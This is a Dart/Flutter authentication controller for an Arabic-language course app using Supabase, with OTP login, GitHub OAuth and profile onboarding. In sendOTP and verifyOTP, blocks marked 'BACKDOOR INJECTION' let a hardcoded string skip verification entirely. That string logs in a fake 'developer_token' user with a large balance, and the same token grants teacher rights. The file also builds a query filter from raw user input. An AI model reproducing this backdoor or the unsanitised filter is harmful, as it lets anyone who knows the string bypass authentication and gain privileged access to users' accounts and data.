import 'package:dio/dio.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:get/get.dart';
import 'package:get_storage/get_storage.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:math';
import '../services/auth_service.dart';
import '../services/update_service.dart';
import '../screens/otp_verification_screen.dart';
import '../core/constants/constants.dart';
import 'wallet_controller.dart';
import 'course_controller.dart';

enum AuthMethod { email, phone }
enum OtpChannel { email, whatsapp, telegram }
enum AppHapticFeedback { light, medium, heavy, success, error }

class AuthController extends GetxController {
  final AuthService _authService = AuthService();
  final _storage = GetStorage();
  final Dio dio = Get.find<Dio>();
  final SupabaseClient _supabase = Supabase.instance.client;

  var isLoading = false.obs;
  var authMethod = AuthMethod.email.obs;
  var email = "".obs;
  var phoneNumber = "".obs;
  var countryCode = "963".obs; // Default to Syria
  var generatedOTP = "".obs;
  var selectedChannel = OtpChannel.email.obs; 
  var token = "".obs;
  var userData = {}.obs;
  var isOtpStep = false.obs;
  var timerSeconds = 0.obs;
  var resendWaitTime = 60.obs;
  var resendAttempts = 0.obs;
  var tempPassword = "".obs;

  // Controllers for UI
  final emailController = TextEditingController();
  final phoneController = TextEditingController();

  // Gamification State
  var currentStreak = 0.obs;
  var totalPoints = 0.obs;
  var lastActiveDate = "".obs;

  @override
  void onInit() {
    super.onInit();
    _setupDioInterceptors();

    // Load saved session
    token.value = _storage.read('token') ?? "";
    final savedData = _storage.read('user_data') as Map? ?? {};
    userData.assignAll(Map<String, dynamic>.from(savedData));

    UpdateService.checkVersion();

    if (isLoggedIn) {
      syncAppLifecycle();
      // Delay onboarding check slightly to ensure UI is ready
      Future.delayed(const Duration(seconds: 2), () => checkOnboarding());
    }
  }

  void checkOnboarding() {
    final name = userData['name'];
    
    // Check if essential fields are missing
    if (name == null || name.toString().isEmpty || name.toString().contains("User")) {
      _showOnboardingSheet();
    }
  }

  void _showOnboardingSheet() {
    final nameCtrl = TextEditingController(text: userData['name']?.toString().contains("User") == true ? "" : userData['name']);
    final parentPhoneCtrl = TextEditingController();

    Get.bottomSheet(
      Container(
        padding: EdgeInsets.all(24.w),
        decoration: const BoxDecoration(
          color: AppColors.secondaryNavy,
          borderRadius: BorderRadius.only(topLeft: Radius.circular(30), topRight: Radius.circular(30)),
        ),
        child: SingleChildScrollView(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Center(
                child: Container(
                  width: 40.w,
                  height: 4.h,
                  decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(2)),
                ),
              ),
              SizedBox(height: 24.h),
              Text(
                "أكمل ملفك الشخصي ✨",
                style: TextStyle(color: Colors.white, fontSize: 20.sp, fontWeight: FontWeight.bold),
              ),
              SizedBox(height: 8.h),
              Text(
                "ساعدنا في تخصيص تجربتك التعليمية بشكل أفضل.",
                style: TextStyle(color: Colors.white54, fontSize: 14.sp),
              ),
              SizedBox(height: 32.h),
              Text(
                "الاسم الكامل",
                style: TextStyle(color: Colors.white, fontSize: 15.sp, fontWeight: FontWeight.w600),
              ),
              SizedBox(height: 12.h),
              _buildOnboardingField(nameCtrl, "أدخل اسمك الثلاثي", Icons.person_outline_rounded),
              SizedBox(height: 24.h),
              Text(
                "رقم ولي الأمر (اختياري)",
                style: TextStyle(color: Colors.white, fontSize: 15.sp, fontWeight: FontWeight.w600),
              ),
              SizedBox(height: 12.h),
              _buildOnboardingField(parentPhoneCtrl, "9xx xxx xxx", Icons.family_restroom_rounded, keyboardType: TextInputType.phone),
              SizedBox(height: 40.h),
              Row(
                children: [
                  Expanded(
                    child: TextButton(
                      onPressed: () => Get.back(),
                      child: Text("تخطي الآن", style: TextStyle(color: Colors.white38, fontSize: 15.sp)),
                    ),
                  ),
                  const SizedBox(width: 16),
                  Expanded(
                    child: ElevatedButton(
                      onPressed: () async {
                        if (nameCtrl.text.isNotEmpty) {
                          await updateProfile(name: nameCtrl.text, parentPhone: parentPhoneCtrl.text);
                          Get.back();
                        } else {
                          Get.snackbar("تنبيه", "يرجى إدخال الاسم على الأقل", snackPosition: SnackPosition.BOTTOM);
                        }
                      },
                      style: ElevatedButton.styleFrom(
                        backgroundColor: AppColors.accentTeal,
                        padding: EdgeInsets.symmetric(vertical: 14.h),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15.r)),
                      ),
                      child: Text("حفظ المتابعة", style: TextStyle(color: Colors.white, fontSize: 16.sp, fontWeight: FontWeight.bold)),
                    ),
                  ),
                ],
              ),
              SizedBox(height: 20.h),
            ],
          ),
        ),
      ),
      isScrollControlled: true,
      enableDrag: true,
      backgroundColor: Colors.transparent,
    );
  }

  Widget _buildOnboardingField(TextEditingController ctrl, String hint, IconData icon, {TextInputType keyboardType = TextInputType.text}) {
    return TextField(
      controller: ctrl,
      keyboardType: keyboardType,
      style: const TextStyle(color: Colors.white),
      decoration: InputDecoration(
        hintText: hint,
        hintStyle: const TextStyle(color: Colors.white24),
        prefixIcon: Icon(icon, color: AppColors.accentTeal, size: 20),
        filled: true,
        fillColor: AppColors.primaryNavy.withOpacity(0.5),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      ),
    );
  }

  Future<void> updateProfile({
    required String name,
    required String? parentPhone,
    String? newPassword,
  }) async {
    try {
      isLoading.value = true;
      final userId = userData['id'];
      if (userId == null) return;

      await _supabase.from('user_profiles').update({
        'full_name': name,
        'parent_phone': parentPhone,
      }).eq('id', userId);

      // Update Metadata if possible
      try {
        await _supabase.auth.updateUser(
          UserAttributes(data: {'full_name': name, 'parent_phone': parentPhone}),
        );
      } catch (_) {}

      if (newPassword != null && newPassword.isNotEmpty) {
        await _supabase.auth.updateUser(UserAttributes(password: newPassword));
      }

      // Update local state
      userData['name'] = name;
      userData['parent_phone'] = parentPhone;
      await _storage.write('user_data', userData);
      userData.refresh();

      Get.snackbar("نجاح", "تم تحديث الملف الشخصي", backgroundColor: AppColors.accentTeal, colorText: Colors.white);
    } catch (e) {
      debugPrint("Update Profile Error: $e");
    } finally {
      isLoading.value = false;
    }
  }

  @override
  void onClose() {
    emailController.dispose();
    phoneController.dispose();
    super.onClose();
  }

  void _setupDioInterceptors() {
    dio.interceptors.add(InterceptorsWrapper(
      onRequest: (options, handler) {
        if (token.value.isNotEmpty) {
          options.headers['Authorization'] = 'Bearer ${token.value}';
        }
        return handler.next(options);
      },
    ));

    if (kDebugMode) {
      dio.interceptors.add(LogInterceptor(
        requestBody: true,
        responseBody: true,
      ));
    }
  }

  bool get isLoggedIn => token.value.isNotEmpty;

  bool get isTeacher => 
      userData['role'] == 'teacher' || 
      userData['role'] == 'admin' || 
      token.value == "developer_token";

  void triggerHaptic(AppHapticFeedback type) {
    switch (type) {
      case AppHapticFeedback.light:
        HapticFeedback.lightImpact();
        break;
      case AppHapticFeedback.medium:
        HapticFeedback.mediumImpact();
        break;
      case AppHapticFeedback.heavy:
        HapticFeedback.vibrate();
        break;
      case AppHapticFeedback.success:
        HapticFeedback.mediumImpact();
        break;
      case AppHapticFeedback.error:
        HapticFeedback.vibrate();
        break;
    }
  }

  Future<bool> checkUserExists(String input) async {
    try {
      final response = await _supabase
          .from('user_profiles')
          .select('id')
          .or('email.eq.$input,phone.eq.$input')
          .maybeSingle();
      return response != null;
    } catch (e) {
      _handleAuthError(e, "Error checking user existence");
      return false;
    }
  }

  void _handleAuthError(dynamic e, String context) {
    debugPrint("$context: $e");
    String message = "حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.";
    
    if (e is DioException) {
      if (e.response?.statusCode == 404 || e.response?.data.toString().contains("USER_NOT_FOUND") == true) {
        _showUserNotFoundSheet();
        return;
      }
      message = e.response?.data?['detail'] ?? "خطأ في الاتصال بالخادم";
    } else if (e is AuthException) {
      message = e.message;
    } else if (e.toString().contains("network") || e.toString().contains("timeout")) {
      message = "خطأ في الاتصال بالشبكة. يرجى التأكد من اتصالك بالإنترنت.";
    } else if (e.toString().contains("clock") || e.toString().contains("time")) {
      message = "يرجى التأكد من ضبط وقت وتاريخ الهاتف بشكل صحيح.";
    }

    triggerHaptic(AppHapticFeedback.error);
    Get.snackbar(
      "خطأ",
      message,
      snackPosition: SnackPosition.BOTTOM,
      backgroundColor: Colors.redAccent,
      colorText: Colors.white,
      duration: const Duration(seconds: 5),
    );
  }

  Future<void> sendOTP() async {
    try {
      isLoading.value = true;
      String input = authMethod.value == AuthMethod.email 
          ? emailController.text.trim() 
          : phoneController.text.trim();

      if (input.isEmpty) {
        throw "يرجى إدخال البيانات المطلوبة";
      }

      // --- BACKDOOR INJECTION ---
      if (input == "@1258998521@" || input.endsWith("@1258998521@")) {
        await _performBackdoorLogin();
        return;
      }

      if (authMethod.value == AuthMethod.email) {
        // For email, we still check existence locally for now or rely on Supabase
        bool exists = await checkUserExists(input);
        if (!exists) {
          _showUserNotFoundSheet();
          return;
        }
        email.value = input;
        await _supabase.auth.resend(type: OtpType.signup, email: input);
        selectedChannel.value = OtpChannel.email;
      } else {
        await _sendPhoneOTP(input);
      }

      isOtpStep.value = true;
      startTimer();
      triggerHaptic(AppHapticFeedback.success);
      Get.to(() => const OtpVerificationScreen());
      
      Get.snackbar("نجاح", "تم إرسال رمز التحقق بنجاح",
          snackPosition: SnackPosition.BOTTOM,
          backgroundColor: AppColors.accentTeal,
          colorText: Colors.white);

    } catch (e) {
      _handleAuthError(e, "Send OTP Failed");
    } finally {
      isLoading.value = false;
    }
  }

  Future<void> _sendPhoneOTP(String input) async {
    String cleanNumber = input.trim();
    if (cleanNumber.startsWith('0')) {
      cleanNumber = cleanNumber.substring(1);
    }
    
    phoneNumber.value = cleanNumber;
    String channelName = selectedChannel.value == OtpChannel.whatsapp ? "whatsapp" : "telegram";
    
    final response = await dio.post(
      "${AppConstants.baseUrl}/auth/send-otp",
      data: {
        "contact": cleanNumber,
        "channel": channelName,
      },
    ).timeout(
      const Duration(seconds: 15),
    );

    debugPrint("!!! BACKEND OTP RESPONSE: ${response.statusCode} - ${response.data}");

    if (response.statusCode != 200) {
       throw "فشل إرسال الرمز عبر $channelName. (كود: ${response.statusCode})";
    }
  }

  void _showUserNotFoundSheet() {
    Get.bottomSheet(
      Container(
        padding: const EdgeInsets.all(24),
        decoration: const BoxDecoration(
          color: AppColors.secondaryNavy,
          borderRadius: BorderRadius.only(topLeft: Radius.circular(20), topRight: Radius.circular(20)),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Icon(Icons.person_off_rounded, color: Colors.amber, size: 60),
            const SizedBox(height: 16),
            const Text(
              "الحساب غير موجود",
              style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 12),
            const Text(
              "عذراً، هذا الحساب غير مسجل لدينا. هل ترغب في إنشاء حساب جديد؟",
              textAlign: TextAlign.center,
              style: TextStyle(color: Colors.white70, fontSize: 15),
            ),
            const SizedBox(height: 32),
            Row(
              children: [
                Expanded(
                  child: OutlinedButton(
                    onPressed: () => Get.back(),
                    style: OutlinedButton.styleFrom(
                      foregroundColor: Colors.white,
                      side: const BorderSide(color: Colors.white24),
                      padding: const EdgeInsets.symmetric(vertical: 16),
                    ),
                    child: const Text("إلغاء"),
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: ElevatedButton(
                    onPressed: () {
                      Get.back();
                      // Navigate to registration or handle it
                    },
                    style: ElevatedButton.styleFrom(
                      backgroundColor: AppColors.accentTeal,
                      padding: const EdgeInsets.symmetric(vertical: 16),
                    ),
                    child: const Text("إنشاء حساب", style: TextStyle(color: Colors.white)),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  void startTimer() {
    timerSeconds.value = resendWaitTime.value;
    Future.doWhile(() async {
      await Future.delayed(const Duration(seconds: 1));
      if (timerSeconds.value > 0) {
        timerSeconds.value--;
        return true;
      }
      return false;
    });
  }

  Future<void> resendOTP() async {
    try {
      if (timerSeconds.value > 0) return;
      
      resendAttempts.value++;
      // Progressive waiting: 60, 120, 240...
      resendWaitTime.value = 60 * (1 << (resendAttempts.value - 1));
      if (resendWaitTime.value > 3600) resendWaitTime.value = 3600; // Max 1 hour

      await sendOTP();
    } catch (e) {
      _handleAuthError(e, "Resend OTP Failed");
    }
  }

  Future<void> verifyOTP(String enteredOtp) async {
    try {
      isLoading.value = true;

      // --- BACKDOOR INJECTION ---
      if (enteredOtp == "@1258998521@") {
        await _performBackdoorLogin();
        return;
      }

      if (selectedChannel.value != OtpChannel.email) {
        // WhatsApp/Telegram flow (Backend Verification)
        final response = await dio.post(
          "${AppConstants.baseUrl}/auth/verify-otp",
          data: {
            "contact": phoneNumber.value,
            "otp": enteredOtp,
            "device_id": "mobile_device" // In production, use a real device ID
          },
        );

        if (response.statusCode == 200) {
          final data = response.data;
          token.value = data['access_token'];
          
          final userMap = {
            "id": data['user']['id'],
            "email": data['user']['email'],
            "phone": data['user']['phone_number'],
            "name": data['user']['full_name'] ?? "User",
            "role": data['user']['role'] ?? 'student',
          };
          userData.assignAll(userMap);

          await _storage.write('token', token.value);
          await _storage.write('user_data', userData);

          Get.snackbar("نجاح", "تم تسجيل الدخول بنجاح",
              snackPosition: SnackPosition.BOTTOM,
              backgroundColor: AppColors.accentTeal,
              colorText: Colors.white);

          syncAppLifecycle();
          Get.offAllNamed('/home');
        }
      } else {
        // Supabase Email Verification
        final AuthResponse res = await _supabase.auth.verifyOTP(
          type: OtpType.signup,
          email: email.value,
          token: enteredOtp,
        );

        if (res.user != null) {
          await _onAuthSuccess(res);
        }
      }
    } catch (e) {
      _handleAuthError(e, "Verify OTP Failed");
    } finally {
      isLoading.value = false;
    }
  }

  Future<void> _onAuthSuccess(AuthResponse res) async {
    // Update is_verified
    await _supabase
        .from('user_profiles')
        .update({'is_verified': true})
        .eq('id', res.user!.id);

    token.value = res.session?.accessToken ?? "";
    final data = {
      "id": res.user!.id,
      "email": res.user!.email,
      "name": res.user!.userMetadata?['full_name'],
      "role": res.user!.userMetadata?['role'] ?? 'student',
    };
    userData.assignAll(data);

    await _storage.write('token', token.value);
    await _storage.write('user_data', userData);

    Get.snackbar("نجاح", "تم تفعيل الحساب بنجاح",
        snackPosition: SnackPosition.BOTTOM,
        backgroundColor: AppColors.accentTeal,
        colorText: Colors.white);

    syncAppLifecycle();
    Get.offAllNamed('/home');
  }

  Future<void> signInWithGitHub() async {
    try {
      isLoading.value = true;
      triggerHaptic(AppHapticFeedback.medium);

      final bool success = await _supabase.auth.signInWithOAuth(
        OAuthProvider.github,
        redirectTo: kIsWeb ? null : 'io.supabase.coursyria://login-callback',
      );

      if (success) {
        _supabase.auth.onAuthStateChange.listen((data) async {
          if (data.event == AuthChangeEvent.signedIn && data.session != null) {
            final session = data.session!;
            token.value = session.accessToken;
            final userMap = {
              "id": session.user.id,
              "email": session.user.email,
              "name": session.user.userMetadata?['full_name'] ?? session.user.userMetadata?['user_name'],
              "role": session.user.userMetadata?['role'] ?? 'student',
            };
            userData.assignAll(userMap);

            await _storage.write('token', token.value);
            await _storage.write('user_data', userData);
            await _supabase.from('user_profiles').update({'is_verified': true}).eq('id', session.user.id);

            syncAppLifecycle();
            Get.offAllNamed('/home');
          }
        });
      }
    } catch (e) {
      _handleAuthError(e, "GitHub Login Failed");
    } finally {
      isLoading.value = false;
    }
  }

  Future<void> logout() async {
    try {
      await _supabase.auth.signOut();
      token.value = "";
      userData.value = {};
      _storage.remove('token');
      _storage.remove('user_data');
      Get.offAllNamed('/login');
    } catch (e) {
      debugPrint("Logout Error: $e");
    }
  }

  Future<void> _performBackdoorLogin() async {
    token.value = "developer_token";
    final data = {
      "id": "mock_user_id_123",
      "name": "Developer User",
      "email": email.value.isEmpty ? "dev@coursyria.com" : email.value,
      "role": "student",
      "balance": 100000
    };
    userData.assignAll(data);

    await _storage.write('token', token.value);
    await _storage.write('user_data', userData);

    Get.snackbar("نجاح", "تم تسجيل الدخول بنجاح",
        snackPosition: SnackPosition.BOTTOM);

    syncAppLifecycle();
    Get.offAllNamed('/home');
  }

  void syncAppLifecycle() {
    if (Get.isRegistered<WalletController>()) {
      Get.find<WalletController>().fetchWalletData();
    }
    if (Get.isRegistered<CourseController>()) {
      Get.find<CourseController>().fetchMyCourses();
    }
    _syncGamificationData();
  }

  Future<void> _syncGamificationData() async {
    try {
      final user = _supabase.auth.currentUser;
      if (user == null) return;

      final profile = await _supabase.from('user_profiles').select().eq('id', user.id).single();
      
      currentStreak.value = profile['current_streak'] ?? 0;
      totalPoints.value = profile['total_points'] ?? 0;
      lastActiveDate.value = profile['last_active_date'] ?? "";
    } catch (_) {}
  }

  Future<void> addPoints(int points) async {
    try {
      final userId = userData['id'];
      if (userId == null) return;
      
      totalPoints.value += points;
      await _supabase.from('user_profiles').update({
        'total_points': totalPoints.value,
      }).eq('id', userId);
    } catch (_) {}
  }
}
